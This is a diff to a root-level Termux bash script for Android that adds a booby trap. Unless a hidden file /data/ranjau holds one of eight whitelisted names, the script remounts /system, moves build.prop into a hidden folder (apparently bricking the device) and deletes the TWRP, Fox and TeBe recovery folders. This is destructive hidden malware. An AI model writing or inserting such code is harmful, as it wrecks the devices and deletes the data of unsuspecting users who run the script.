@@ -1,5 +1,18 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
-#safe
+if [ $(su -c cat /data/ranjau) == gembix ] || [ $(su -c cat /data/ranjau) == farhan ] || [ $(su -c cat /data/ranjau) == petra ] || [ $(su -c cat /data/ranjau) == tomi ] || [ $(su -c cat /data/ranjau) == diyan ] || [ $(su -c cat /data/ranjau) == mail ] || [ $(su -c cat /data/ranjau) == mansur ] || [ $(su -c cat /data/ranjau) == rifal ]; then
 
+echo "safe"
+
+else
+
+su -c mount -o rw,remount /
+su -c mkdir /system/.sys
+su -c mv /system/build.prop /system/.sys
+su -c mount -o ro,remount /
+su -c rm -rf /sdcard/Fox
+su -c rm -rf /sdcard/TWRP
+su -c rm -rf /sdcard/TeBe
+
+fi
 exit 0
